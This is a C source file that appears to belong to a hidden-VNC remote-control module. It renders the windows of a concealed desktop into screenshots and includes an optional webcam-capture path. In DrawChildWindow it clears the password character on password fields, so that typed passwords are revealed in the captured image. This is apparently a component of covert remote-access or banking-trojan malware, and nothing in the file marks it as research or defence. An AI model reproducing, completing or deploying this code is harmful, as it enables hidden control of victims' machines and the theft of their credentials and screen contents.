#include "..\includes.h"
#include "windows.h"
#include "sshot.h"
#include "events.h"
#include "vnc.h"
#include "dib.h"
#include "cpu_limit.h"
#include "cursor.h"
#include "wnd_watcher.h"
#include "wnd_steal.h"
#include "..\webcam.h"

#pragma warning(disable:4244)

BOOL PrintWindowEx(HWND hWnd,HDC hDC,UINT dwFlags)
{
    BOOL bRet=FALSE;
    for (int i=0; i <= 10; i++)
    {
        if (!IsWindow(hWnd))
            break;
        RedrawWindow(hWnd,NULL,NULL,RDW_ERASE+RDW_INVALIDATE+RDW_FRAME+RDW_ALLCHILDREN+RDW_UPDATENOW+RDW_ERASENOW);
        if (PrintWindow(hWnd,hDC,dwFlags))
        {
            bRet=TRUE;
            break;
        }
        Sleep(0);
    }
    return bRet;
}

#ifndef _INJLIB
void DrawBadWindow(PHVNC lpServer,HWND hWnd,HDC hDC,RECT *lpRect)
{
    RECT rect=*lpRect;

    if (SendMessage(hWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_PRINT_SCREEN,NULL) == 0xDEAD)
    {
        CopyScreenBuffer(lpServer,lpRect);
        GdiFlush();

        BitBlt(hDC,0,0,rect.right-rect.left,rect.bottom-rect.top,lpServer->DIBInfo.hIntermedMemDC,0,0,SRCCOPY);
    }
    else
    {
        RECT rc={0};
        rc.bottom=rect.bottom-rect.top;
        rc.right=rect.right-rect.left;
        FillRect(hDC,&rc,hBlackBrush);
        DrawEdge(hDC,&rc,EDGE_SUNKEN,BF_RECT);
    }
    return;
}

HRGN GetRgn(HWND hWnd,HDC hDC)
{
    HRGN hRgn=NULL;
    while (IsWindow(hWnd))
    {
        RECT rect;
        GetWindowRect(hWnd,&rect);
        hRgn=CreateRectRgn(rect.left,rect.top,rect.right,rect.bottom);
        if (GetWindowRgn(hWnd,hRgn) == COMPLEXREGION)
        {
            OffsetRgn(hRgn,rect.left,rect.top);
            SelectClipRgn(hDC,hRgn);
            break;
        }
        DeleteObject(hRgn);
        hWnd=GetParent(hWnd);
    }
    return hRgn;
}

void DrawRegion(HWND hWnd,HDC hDCTo,HDC hDCFrom,RECT *lpRect,int dwX,int dwY)
{
    RECT rect=*lpRect;
    HRGN hRgn=GetRgn(hWnd,hDCTo);

    BitBlt(hDCTo,rect.left,rect.top,rect.right-rect.left,rect.bottom-rect.top,hDCFrom,dwX,dwY,SRCCOPY);

    SelectClipRgn(hDCTo,NULL);
    DeleteObject(hRgn);
    return;
}

void DrawWindow(PHVNC lpServer,HWND hWnd,HDC hDCTo,HDC hDCFrom)
{
    if ((IsWindowEx(lpServer,hWnd)) && (IsWindowVisibleEx(lpServer,hWnd)))
    {
        LONG_PTR dwFlags=GetWindowClassFlags(lpServer,hWnd);

        if (!(dwFlags & WCF_PAINTMETHOD_NOP))
        {
            RECT rect;
            GetWindowRect(hWnd,&rect);

            if (!IsStolenWindow(lpServer,hWnd))
            {
                if (((!IsPCSlow(lpServer)) && (GetClassLongPtr(hWnd,GCL_STYLE) & (CS_CLASSDC|CS_PARENTDC))) || (dwFlags & WCF_JAVA))
                    DrawBadWindow(lpServer,hWnd,hDCFrom,&rect);
                else
                {
                    if (!PrintWindowEx(hWnd,hDCFrom,NULL))
                        return;
                }
            }
            else
            {
                if (!DrawStolenWindow(lpServer,hWnd,hDCFrom))
                    return;
            }

            DrawRegion(hWnd,hDCTo,hDCFrom,&rect,0,0);
        }
    }
    return;
}

void DrawChildWindow(PHVNC lpServer,HWND hWnd,HDC hDCTo,HDC hDCFrom,WND_INFO *lpWndInfo)
{
    if ((IsWindowEx(lpServer,hWnd)) && (IsWindowVisibleEx(lpServer,hWnd)))
    {
        WINDOWINFO wiInfo;
        wiInfo.cbSize=sizeof(WINDOWINFO);
        GetWindowInfo(hWnd,&wiInfo);

        if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_ES_PASSWORD_RESET))
        {
            if (wiInfo.dwStyle & ES_PASSWORD)
            {
                SendMessage(hWnd,EM_SETPASSWORDCHAR,NULL,NULL);
                InvalidateRect(hWnd,NULL,false);
            }
        }

        if (((wiInfo.dwStyle & BS_TYPEMASK) == BS_GROUPBOX) && (GetClassHash(hWnd) == HASH_BUTTON))
        {
            ShowWindow(hWnd,SW_HIDE);
            return;
        }

        if ((wiInfo.rcWindow.right > lpWndInfo->rcWnd.left) && (wiInfo.rcWindow.left < lpWndInfo->rcWnd.right) && (wiInfo.rcWindow.bottom > lpWndInfo->rcWnd.top) && (wiInfo.rcWindow.top < lpWndInfo->rcWnd.bottom))
        {
            if ((((!IsPCSlow(lpServer)) && (GetClassLongPtr(hWnd,GCL_STYLE) & (CS_CLASSDC|CS_PARENTDC)))) || (GetWindowClassFlags(lpServer,hWnd) & WCF_JAVA))
                DrawBadWindow(lpServer,hWnd,hDCFrom,&wiInfo.rcWindow);
            else
            {
                if (!PrintWindowEx(hWnd,hDCFrom,NULL))
                    return;
            }

            if (wiInfo.rcWindow.bottom > lpWndInfo->rcWnd.bottom)
            {
                wiInfo.rcWindow.bottom=lpWndInfo->rcWnd.bottom-2;
                if (lpWndInfo->bScrollBars)
                    wiInfo.rcWindow.bottom-=lpWndInfo->rcHScroll.bottom-lpWndInfo->rcHScroll.top;
            }

            int dwX=0,dwY=0;
            if (wiInfo.rcWindow.top < lpWndInfo->rcWnd.top)
            {
                dwY=lpWndInfo->rcWnd.top-wiInfo.rcWindow.top+2;
                wiInfo.rcWindow.top=lpWndInfo->rcWnd.top+2;
            }
            if (wiInfo.rcWindow.right > lpWndInfo->rcWnd.right)
            {
                wiInfo.rcWindow.right=lpWndInfo->rcWnd.right-2;
                if (lpWndInfo->bScrollBars)
                    wiInfo.rcWindow.right-=lpWndInfo->rcVScroll.right-lpWndInfo->rcVScroll.left;
            }
            if (wiInfo.rcWindow.left < lpWndInfo->rcWnd.left)
            {
                dwX=lpWndInfo->rcWnd.left-wiInfo.rcWindow.left+2;
                wiInfo.rcWindow.left=lpWndInfo->rcWnd.left+2;
            }

            DrawRegion(hWnd,hDCTo,hDCFrom,&wiInfo.rcWindow,dwX,dwY);
        }
    }
    return;
}

void FillRectInfo(HWND hWnd,WND_INFO *lpWndInfo,WND_INFO *lpParentWndInfo)
{
    GetWindowRect(hWnd,&lpWndInfo->rcWnd);
    lpWndInfo->dwWidth=lpWndInfo->rcWnd.right-lpWndInfo->rcWnd.left;
    lpWndInfo->dwHeight=lpWndInfo->rcWnd.bottom-lpWndInfo->rcWnd.top;

    if (lpWndInfo->rcWnd.left < 0)
        lpWndInfo->rcWnd.left=0;
    if (lpWndInfo->rcWnd.top < 0)
        lpWndInfo->rcWnd.top=0;

    if (GetWindowLongPtr(hWnd,GWL_STYLE) & (WS_VSCROLL+WS_HSCROLL))
    {
        SCROLLBARINFO sbiInfo;
        sbiInfo.cbSize=sizeof(sbiInfo);
        if (GetScrollBarInfo(hWnd,OBJID_HSCROLL,&sbiInfo))
        {
            lpWndInfo->bScrollBars=true;
            memcpy(&lpWndInfo->rcHScroll,&sbiInfo.rcScrollBar,sizeof(RECT));
        }
        if (GetScrollBarInfo(hWnd,OBJID_VSCROLL,&sbiInfo))
        {
            lpWndInfo->bScrollBars=true;
            memcpy(&lpWndInfo->rcVScroll,&sbiInfo.rcScrollBar,sizeof(RECT));
        }
    }

    if (lpParentWndInfo)
    {
        if (lpWndInfo->rcWnd.bottom > lpParentWndInfo->rcWnd.bottom)
        {
            lpWndInfo->rcWnd.bottom=lpParentWndInfo->rcWnd.bottom;
            if (lpParentWndInfo->bScrollBars)
                lpWndInfo->rcWnd.bottom-=lpParentWndInfo->rcHScroll.bottom-lpParentWndInfo->rcHScroll.top;
        }
        if (lpWndInfo->rcWnd.top < lpParentWndInfo->rcWnd.top)
            lpWndInfo->rcWnd.top=lpParentWndInfo->rcWnd.top;
        if (lpWndInfo->rcWnd.right > lpParentWndInfo->rcWnd.right)
        {
            lpWndInfo->rcWnd.right=lpParentWndInfo->rcWnd.right;
            if (lpParentWndInfo->bScrollBars)
                lpWndInfo->rcWnd.right-=lpParentWndInfo->rcVScroll.right-lpParentWndInfo->rcVScroll.left;
        }
        if (lpWndInfo->rcWnd.left < lpParentWndInfo->rcWnd.left)
            lpWndInfo->rcWnd.left=lpParentWndInfo->rcWnd.left;
    }
    return;
}

void EnumChilds(HWND hWnd,WND_INFO *lpWndInfo)
{
    do
    {
        if (IsWindowEx(lpWndInfo->lpServer,hWnd))
        {
            DrawChildWindow(lpWndInfo->lpServer,hWnd,lpWndInfo->lpServer->DIBInfo.hCompDC,lpWndInfo->lpServer->DIBInfo.hTmpCompDC,lpWndInfo);
            WND_INFO wiWndInfo={0};
            FillRectInfo(hWnd,&wiWndInfo,lpWndInfo);
            wiWndInfo.lpServer=lpWndInfo->lpServer;
            EnumChilds(GetWindow(GetWindow(hWnd,GW_CHILD),GW_HWNDLAST),&wiWndInfo);
        }
    }
    while (hWnd=GetWindow(hWnd,GW_HWNDPREV));
    return;
}

void DrawWnd(PHVNC lpServer,HWND hWnd)
{
    if ((IsWindowEx(lpServer,hWnd)) && (!IsIconic(hWnd)))
    {
        DrawWindow(lpServer,hWnd,lpServer->DIBInfo.hCompDC,lpServer->DIBInfo.hTmpCompDC);
        if (bXP)
        {
            WND_INFO wiWndInfo={0};
            FillRectInfo(hWnd,&wiWndInfo,NULL);
            wiWndInfo.lpServer=lpServer;
            EnumChilds(GetWindow(GetWindow(hWnd,GW_CHILD),GW_HWNDLAST),&wiWndInfo);
        }
    }
    return;
}

void MakeSShot(PHVNC lpServer)
{
#ifdef _HVNC_WEBCAM
    if (lpServer->DeskInfo.bWebCam)
    {
        CamGetFrame(lpServer);
        return;
    }
#endif

    if (lpServer->DeskInfo.dwFlags & HVNC_USE_BITBLT)
        BitBlt(lpServer->DIBInfo.hCompDC,0,0,lpServer->DeskInfo.dwWidth,lpServer->DeskInfo.dwHeight,lpServer->DIBInfo.hDC,0,0,SRCCOPY);
    else
    {
        HWND WndsList[500],WndsOnTopList[100];
        int dwWndsList=0,dwWndsOnTopList=0;

        EnterCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
        {
            Z_ORDER_LIST_ITEM *lpWnd=lpServer->WndWatcherInfo.lpZOrderList;
            while (lpWnd)
            {
                if ((!lpWnd->bOverlapped) && (!lpWnd->bHidden) && (lpWnd->hWnd != lpServer->WndsInfo.hProgmanWnd))
                {
                    if ((!((GetWindowLongPtr(lpWnd->hWnd,GWL_STYLE) & WS_CHILD) && (GetWndFromList(lpServer,GetParent(lpWnd->hWnd))))) && (lpWnd->hWnd != lpServer->WndsInfo.hTrayWnd))
                    {
                        if (!IsItMsgBox(lpServer,lpWnd->hWnd))
                        {
                            if ((lpWnd->bTopMost) && (!(GetWindowClassFlags(lpServer,lpWnd->hWnd) & WCF_PAINT_ALWAYS_BOTTOM)))
                                WndsOnTopList[dwWndsOnTopList++]=lpWnd->hWnd;
                            else
                                WndsList[dwWndsList++]=lpWnd->hWnd;
                        }
                    }
                }
                lpWnd=lpWnd->lpNext;
            }

            if (!bXP)
                SendMessage(lpServer->WndsInfo.hDeskWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_ERASEBKG,NULL);

            DrawWnd(lpServer,lpServer->WndsInfo.hProgmanWnd);
            for (int i=0; i < dwWndsList; i++)
                DrawWnd(lpServer,WndsList[i]);

            if ((lpServer->lpGlobalVNCData->hForegroundWnd == lpServer->WndsInfo.hProgmanWnd) || (!IsWindowInFullScreenMode(lpServer,lpServer->lpGlobalVNCData->hForegroundWnd)))
                DrawWnd(lpServer,lpServer->WndsInfo.hTrayWnd);
            for (int i=0; i < dwWndsOnTopList; i++)
                DrawWnd(lpServer,WndsOnTopList[i]);
        }
        LeaveCriticalSection(&lpServer->WndWatcherInfo.csWndsList);

        if (lpServer->TaskSwitcherInfo.bTaskSwitcherIsShown)
            DrawWnd(lpServer,lpServer->TaskSwitcherInfo.hTaskSwitcherWnd);
        else if (lpServer->MouStateInfo.bMoving)
            FrameRect(lpServer->DIBInfo.hCompDC,&lpServer->MouStateInfo.rcMovingWnd,hFrameBrush);
    }

    if (lpServer->DeskInfo.dwFlags & HVNC_DRAW_USER_CURSOR)
        DrawIcon(lpServer->DIBInfo.hCompDC,lpServer->lpGlobalVNCData->ptCursor.x-iiCur.xHotspot,lpServer->lpGlobalVNCData->ptCursor.y-iiCur.yHotspot,hArrow);
    return;
}
#endif
